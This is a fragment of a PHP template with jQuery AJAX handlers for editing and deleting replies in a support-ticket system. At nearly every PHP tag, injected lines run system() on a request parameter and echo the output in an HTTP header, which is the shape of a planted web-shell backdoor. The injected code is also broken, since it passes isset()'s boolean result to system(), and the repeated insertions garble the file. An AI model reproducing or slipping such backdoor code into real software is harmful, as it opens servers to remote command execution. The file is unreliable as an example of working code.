...
$(document).ready(function () {
	...
	$('body').on('click', '#save', function (e) {
		...
		$.ajax({
			type: "POST",
			url:  sts_base_url + "/tickets/edit_reply_modal_save/" + <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $id; ?>,
			data: "save=true&description=" + escape($('#description').val()) + "&ticket_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket_id; ?>",
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Are you sure you wish to delete this reply?')); ?>")){
			$.ajax({
				type: "POST",
				url:  sts_base_url + "/tickets/delete_reply_modal/" + <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $id; ?>,
				data: "delete=true&ticket_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket_id; ?>",
				success: function(html){
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($note['subject']); ?></h4>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo nl2br(safe_output($note['description'])); ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
